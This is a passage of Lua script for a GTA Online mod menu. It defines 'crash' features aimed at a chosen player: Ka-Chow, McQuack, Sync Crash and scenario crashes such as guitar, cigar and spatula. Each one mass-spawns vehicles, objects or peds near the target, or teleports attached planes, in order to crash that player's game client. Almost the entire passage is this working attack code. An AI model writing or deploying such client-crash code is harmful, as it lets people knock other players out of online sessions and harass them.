            local pos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(handle, pos.x, pos.y, pos.z + 1, false, false, false)
        end)
    end
end

menu.toggle_loop(kachowlatest, "Boosted Ka-Chow", {"boostkachow"}, "", function()
    menu.trigger_commands("kachowwww" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("moreotherss" .. PLAYER.GET_PLAYER_NAME(pid))
end)

-- local jet_netID;
menu.toggle_loop(kachowlatest, "Ka-Chow", {"kachowwww"}, "Press and hold down the enter button", function()
    menu.trigger_commands("anticrashcamera on")
    if PED.IS_PED_IN_ANY_VEHICLE(GetLocalPed(), false) then
        local jet = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
        -- if VEHICLE.GET_VEHICLE_CLASS(jet) == 16 then --16 class is planes
        -- jet_netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(jet)
        ENTITY.SET_ENTITY_PROOFS(jet, true, true, true, true, true, true, true, true)
        -- ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        -- local let_coords = coords[math.random(1, #coords)]--function() for i =1, 32 do if PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i) then return ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i)) end end end
        if players.exists(to_ply) then 
            local asda = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(to_ply)) 
            util.toast('Player ID: '..to_ply..' | asda.x: '.. asda.x.. 'asda.y: '.. asda.y..'asda.z: '.. asda.z)
            ENTITY.SET_ENTITY_COORDS(jet, asda.x, asda.y, asda.z + 50, false, false, false, true) 
            to_ply = to_ply +1
        else 
            if to_ply >= 32 then to_ply = 0 end
            to_ply = to_ply +1 
            local let_coords = coords[math.random(1, #coords)]
            ENTITY.SET_ENTITY_COORDS(jet, let_coords[1], let_coords[2], let_coords[3], false, false, false, true) 
        end
            
        ENTITY.SET_ENTITY_VELOCITY(jet, 0, 0, 0) -- velocity sync fuck
        ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        local pedpos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
        pedpos.z = pedpos.z + 10
        for i = 1, 2 do
            local s_plane = planes[math.random(1, #planes)]
            RqModel(util.joaat(s_plane))
            local veha1 = entities.create_vehicle(util.joaat(s_plane), pedpos, 0)

            ENTITY.ATTACH_ENTITY_TO_ENTITY_PHYSICALLY(veha1, jet, 0, 0, 0, 0, 5 + (2 * i), 0, 0, 0, 0, 0, 0, 1000, true,
                true, true, true, 2)
        end
        AddEntityToList("Plane: ", jet, true)
        util.toast("Waiting 5sec for syncs...")
        util.yield(3500) -- 5k is original
        for i = 1, 25 do -- 50 is original
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jet, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
            --ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jet, 252, 2815, 120, false, false, false) -- far away teleport (sync fuck)
            util.yield()
        end
    else
        util.toast("Alert | You are not in a vehicle")
        RqModel(util.joaat('lazer'))
        local spawn_in = entities.create_vehicle(util.joaat('lazer'), ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID()), 0.0)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), spawn_in, -1)
    end
end)

menu.toggle_loop(kachowlatest, "Spawn Others", {"moreotherss"}, "May improve crashing.", function()
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " cuban800")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " titan")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " duster")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " luxor")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " Stunt")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " velum")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " Shamal")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " Lazer")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " vestra")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " volatol")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " besra")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " dodo")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " alkonost")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " velum2")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " hydra")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " luxor2")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " nimbus")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " howard")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " alphaz1")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " seabreeze")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " nokota")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " molotok")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " starling")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " tula")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " microlight")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " rogue")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " pyro")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " mogul")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " strikeforce")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " avenger")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " avenger2")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " bombushka")
    util.yield(10)
    menu.trigger_commands("as " .. PLAYER.GET_PLAYER_NAME(pid) .. " microlight")
end)


menu.toggle_loop(kachowlatest, "Delete Crash Every 5 Seconds", {"deletingcrashes"}, "Delete every 5 seconds.", function()
    util.yield(5000)
    menu.trigger_commands("deletecrashes")
    menu.trigger_commands("noentities")
    util.yield(1000)
    menu.trigger_commands("noentities")
end)


menu.toggle_loop(kachowlatest, "Crash Cam Off", {}, "", function()
    menu.trigger_commands("anticrashcamera off")
end)

menu.toggle_loop(kachowlatest, "TP On Ped Loop", {"tploops"}, "If they dont crash use this.", function()
    menu.trigger_commands("tp" .. PLAYER.GET_PLAYER_NAME(pids))
    util.yield(1)
end)


----------------------------------------------------------------------------------------------------------------------------------------------


local spawnDistance = 0
local vehicleType = { 'kosatka', 'hydra', 'cargoplane', 'bombushka', 'volatol', 'armytrailer2', 'flatbed', 'tug', 'cargobob', 'cargobob2'}
 local coords = {
    {-1718.5878, -982.02405, 322.83115},
    {-2671.5007, 3404.2637, 455.1972},
    {9.977266, 6621.406, 306.46536 },
    {3529.1458, 3754.5452, 109.96472},
    {252, 2815, 120},
}
local to_ply = 1

local selected = 1
local spawnedPlanes = {}
local craftcrash = menu.list(Removals_List, "McQuack Crashes", {}, "")

menu.toggle_loop(craftcrash, "Start McQuack", {"mcquackloop"}, "Hold down enter...", function (on_toggle)
    menu.trigger_commands("anticrashcamera")
    local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local modelHash <const> = util.joaat(vehicleType[selected])
    local startTime = util.current_time_millis()
    local lastExplosion
    local lastSpawn
    STREAMING.REQUEST_MODEL(modelHash)
    while not STREAMING.HAS_MODEL_LOADED(modelHash) do
        util.yield_once()
    end
    if PED.IS_PED_IN_ANY_VEHICLE(GetLocalPed(), false) then
        local jet = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
        -- if VEHICLE.GET_VEHICLE_CLASS(jet) == 16 then --16 class is planes
        -- jet_netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(jet)
        ENTITY.SET_ENTITY_PROOFS(jet, true, true, true, true, true, true, true, true)
        ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        ENTITY.SET_ENTITY_QUATERNION(jet, 0, 0, 0, 2, true)
         local let_coords = coords[math.random(1, #coords)] --function() for i =1, 32 do if PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i) then return ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i)) end end end
        if players.exists(to_ply) then 
            local asda = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(to_ply)) 
            util.toast('Player ID: '..to_ply..' | asda.x: '.. asda.x.. 'asda.y: '.. asda.y..'asda.z: '.. asda.z)
            ENTITY.SET_ENTITY_COORDS(jet, asda.x, asda.y, asda.z + 50, false, false, false, true) 
            to_ply = to_ply +1
        else 
            if to_ply >= 32 then to_ply = 0 end
            to_ply = to_ply +1 
            local let_coords = coords[math.random(1, #coords)]
            ENTITY.SET_ENTITY_COORDS(jet, let_coords[1], let_coords[2], let_coords[3], false, false, false, true) 
        end
        ENTITY.SET_ENTITY_VELOCITY(jet, 0, 0, 0) -- velocity sync fuck
        ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        ENTITY.SET_ENTITY_QUATERNION(jet, 0, 0, 0, 2, true)
        local pedpos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
        pedpos.z = pedpos.z + 10
        for i = 1, 2 do
            local s_plane = vehicleType[math.random(1, #vehicleType)]
            RqModel(util.joaat(s_plane))
            local veha1 = entities.create_vehicle(util.joaat(s_plane), pedpos, 0)
            ENTITY.ATTACH_ENTITY_TO_ENTITY_PHYSICALLY(veha1, jet, 0, 0, 0, 0, 5 + (2 * i), 0, 0, 0, 0, 0, 0, 1000, true,
                true, true, true, 2)
        end
        util.yield(3500) -- 5k is original
        for i = 1, 25 do -- 50 is original
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jet, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
            --ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jet, 252, 2815, 120, false, false, false) -- far away teleport (sync fuck)
            util.yield()
        end
    else
        RqModel(util.joaat('hydra'))
        local spawn_in = entities.create_vehicle(util.joaat('hydra'), ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID()), 0.0)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), spawn_in, -1)
    end
    util.yield(1000)
    local ct = 0
    for k,ent in pairs(entities.get_all_vehicles_as_handles()) do
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ent, false, false)
        entities.delete_by_handle(ent)
        return
    end
    while util.current_time_millis() - startTime < 20000 do
        local pos = playerposition(playerPed, spawnDistance)
        pos.z = pos.z + 30.0
        if not lastSpawn or util.current_time_millis() - lastSpawn > 10 then
            local plane = entities.create_vehicle(modelHash, pos, 0.0)
            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(plane), true)
            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(plane, false, true)
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(plane), players.user(), true)
            table.insert(spawnedPlanes, plane)
            lastSpawn = util.current_time_millis()
        end
        if not lastExplosion or util.current_time_millis() - lastExplosion > 1000 then
            FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, false, 0.0, false)
            lastExplosion = util.current_time_millis()
        end
        if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(pid) then break end
        util.yield_once()
    end
    deletehandlers(spawnedPlanes)
    spawnedPlanes = {}
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED	(modelHash)
    menu.trigger_commands("noentities")
end)


menu.slider(craftcrash, "McQuack Distance", {}, "", 0, 500, spawnDistance, 25, function(distance)
    spawnDistance = distance
end)

-----------------------------------------------------------------------------------------------------------------------------------------------------------


local synccrashes = menu.list(Removals_List, "Sync Crashes", {}, "")

menu.toggle(synccrashes, "Sync Crash", {"synccrash"}, "", function(on_toggle)
    if on_toggle then
    local cord = getEntityCoords(getPlayerPed(pid))
    menu.trigger_commands("anticrashcamera on")
    util.yield(1000)
    local object = entities.create_object(util.joaat("docktrailer"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("docktug"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("trailers2"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("tvtrailer"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("trflat"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("hei_prop_carrier_trailer_01"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("cs2_02_temp_trailer"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("tr_prop_tr_truktrailer_01a"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("trailer_casting"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("trailer_casting_int"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local vehicle = entities.create_object(util.joaat("dubsta"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local vehicle = entities.create_object(util.joaat("hydra"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    util.yield(1000)
    local object = entities.create_object(util.joaat("sm_prop_smug_havok"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("dt1_11_heliport"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("dt1_11_heliport_st"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("sf_prop_sf_heli_blade_b_02a"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("w_ex_snowball"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("w_ex_apmine"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("w_lr_homing_rocket"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("prop_xmas_tree_int"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("prop_xmas_ext"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local object = entities.create_object(util.joaat("v_31a_jh_tunn_03aextra"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local vehicle = entities.create_object(util.joaat("issi8"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    local vehicle = entities.create_object(util.joaat("kosatka"), cord, ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
    util.yield(5000)
    menu.trigger_commands("noentities" .. players.get_name(pid))
    util.yield(1000)
    menu.trigger_commands("noentities" .. players.get_name(pid))
    util.yield(100)
    menu.trigger_commands("anticrashcamera off")
    else
        menu.trigger_commands("anticrashcamera off")
    end
end)

-----------------------------------------------------------------------------------------------------------------------------------------------------------

local TaskCrashes = menu.list(Removals_List, "Task Crashes", {"taskcrashes"}, "Spawns animations next to them for crashing.")

local crash_ents = {}
   local BrokenScenarioPeds = {
       "s_m_y_construct_01",
       "s_m_y_construct_02",
       "csb_janitor",
       "ig_russiandrunk",
       "s_m_m_gardener_01",
       "s_m_y_winclean_01",
       "a_f_m_bodybuild_01",
       "s_m_m_cntrybar_01",
       "s_m_y_chef_01",
       "ig_abigail",
   }
   local BrokenScenarios = {
       "WORLD_HUMAN_CONST_DRILL",
       "WORLD_HUMAN_HAMMERING",
       "WORLD_HUMAN_JANITOR",
       "WORLD_HUMAN_DRINKING",
       "WORLD_HUMAN_GARDENER_PLANT",
       "WORLD_HUMAN_MAID_CLEAN",
       "WORLD_HUMAN_MUSCLE_FREE_WEIGHTS",
       "WORLD_HUMAN_STAND_FISHING",
       "PROP_HUMAN_BBQ",
       "WORLD_HUMAN_WELDING",
   }
   local BrokenScenariosProps = {
       "prop_tool_jackham",
       "prop_tool_hammer",
       "prop_tool_broom",
       "prop_amb_40oz_02",
       "prop_cs_trowel",
       "prop_rag_01",
       "prop_curl_bar_01",
       "prop_fishing_rod_01",
       "prop_fish_slice_01",
       "prop_weld_torch",
       "p_amb_coffeecup_01",
   }

   menu.toggle_loop(TaskCrashes, "Scenario Crash V1", {"scenariocrashv1"}, "Made By Aplics.", function(val)
    menu.trigger_commands("scenariocrashv2" .. PLAYER.GET_PLAYER_NAME(pid))
    menu.trigger_commands("spawnammount" .. PLAYER.GET_PLAYER_NAME(pid) .. " 2500")
    menu.trigger_commands("spawndelay" .. PLAYER.GET_PLAYER_NAME(pid) .. " 0")
    menu.trigger_commands("sendobjects" .. PLAYER.GET_PLAYER_NAME(pid))
   end)

   menu.divider(TaskCrashes, "_________________________________________")

   local crash_toggle = false
   menu.toggle(TaskCrashes, "Scenario Crash V2", {"scenariocrashv2"}, "Made By Aplics.", function(val)
       crash_toggle = val
           if val then
               local ped_pos = players.get_position(pid)
               ped_pos.z += 3
               for i = 1, 10 do
                   local ped_mdl = util.joaat(BrokenScenarioPeds[i])
                   request_model(ped_mdl)
                   local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                   crash_ents[i] = ped
                   PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                   TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                   ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                   
               end
               repeat
                   for i=1, #crash_ents do
                       TASK.CLEAR_PED_TASKS_IMMEDIATELY(crash_ents[i])
                       TASK.TASK_START_SCENARIO_IN_PLACE(crash_ents[i], BrokenScenarios[i], 0, false)
                   end
                   for i=1, #BrokenScenariosProps do
                       for k, v in entities.get_all_objects_as_pointers() do
                           if entities.get_model_hash(v) == util.joaat(BrokenScenariosProps[i]) then
--                               entities.delete_by_pointer(v)
                           end
                       end
                   end
                   util.yield_once()
                   util.yield_once()
               until not (crash_toggle and players.exists(pid))
               crash_toggle = false
               for k, obj in crash_ents do
--                   entities.delete_by_handle(obj)
               end
               crash_ents = {}
           else
               for k, obj in crash_ents do
--                   entities.delete_by_handle(obj)
               end
               for i=1, #BrokenScenariosProps do
                   for k, v in entities.get_all_objects_as_pointers() do
                       if entities.get_model_hash(v) == util.joaat(BrokenScenariosProps[i]) then
--                           entities.delete_by_pointer(v)
                       end
                   end
               end
               crash_ents = {}
           end
       end)

       menu.divider(TaskCrashes, "_________________________________________")

       menu.toggle(TaskCrashes, "All Scenario Crashes", {"togglescenariocrashes"}, "It's risky to spectate using this but your call", function(on_toggle)
        if on_toggle then
            util.yield()
            menu.trigger_commands("anticrashcamera")
            util.yield()
            menu.trigger_commands("bongoguitarscrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("cigarscrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("spatularcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("barbellcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("hammercrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("fishingcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("jackhammercrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("broomcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("drunkcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("trowelcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("wincleancrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("torchcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("coffeecrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
        else
            util.yield()
            menu.trigger_commands("bongoguitarscrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("cigarscrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("spatularcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("barbellcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("hammercrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("fishingcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("jackhammercrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("broomcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("drunkcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("trowelcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("wincleancrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("torchcrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("coffeecrash" .. PLAYER.GET_PLAYER_NAME(pid))
            util.yield(200)
            menu.trigger_commands("noentities")
            util.yield(200)
            menu.trigger_commands("noentities")
            util.yield()
            menu.trigger_commands("anticrashcamera")
            end
        end)
       
       menu.divider(TaskCrashes, "_________________________________________")

       local peds = 5
menu.slider(TaskCrashes, "Number Of Guitars & Bongos", {"noguitarsnbongos"}, "Sends Guitar & Bongos crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Guitar & Bongos Crash", {"bongoguitarscrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("IG_Musician_00")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_MUSICIAN", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_acc_guitar_01") then
--                        entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)


local peds = 5
menu.slider(TaskCrashes, "Number Of Cigars", {"nocigars"}, "Sends Cigar crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)


local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Cigar Crash", {"cigarscrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("A_F_Y_BevHills_02")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_SMOKING", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("ng_proc_cigarette01a") then
--                        entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

local peds = 5
menu.slider(TaskCrashes, "Number Of Spatulas", {"nospatulars"}, "Sends Spatula crash.", 1, 45, 45, 1, function(amount)
    peds = amount
end)

local crash_ents = {}
local crash_toggle = false
menu.toggle(TaskCrashes, "Spatula Crash", {"spatularcrash"}, "It's risky to spectate using this but your call", function(val)
    crash_toggle = val
        if val then
            local number_of_peds = peds
            local ped_mdl = util.joaat("ig_siemonyetarian")
            local ply_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
            local ped_pos = players.get_position(pid)
            ped_pos.z += 3
            request_model(ped_mdl)
            for i = 1, number_of_peds do
                local ped = entities.create_ped(26, ped_mdl, ped_pos, 0)
                crash_ents[i] = ped
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                TASK.TASK_SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                ENTITY.SET_ENTITY_VISIBLE(ped, true)
            end
            repeat
                for k, ped in crash_ents do
                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(ped)
                    TASK.TASK_START_SCENARIO_IN_PLACE(ped, "PROP_HUMAN_BBQ", 0, false)
                end
                for k, v in entities.get_all_objects_as_pointers() do
                    if entities.get_model_hash(v) == util.joaat("prop_fish_slice_01") then
--                        entities.delete_by_pointer(v)
                    end
                end
                util.yield_once()
                util.yield_once()
            until not (crash_toggle and players.exists(pid))
            crash_toggle = false
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        else
            for k, obj in crash_ents do
--                entities.delete_by_handle(obj)
            end
            crash_ents = {}
        end
end)

local peds = 5
menu.slider(TaskCrashes, "Number Of Barbell", {"nobarbell"}, "Sends Barbell crash.", 1, 45, 45, 1, function(amount)
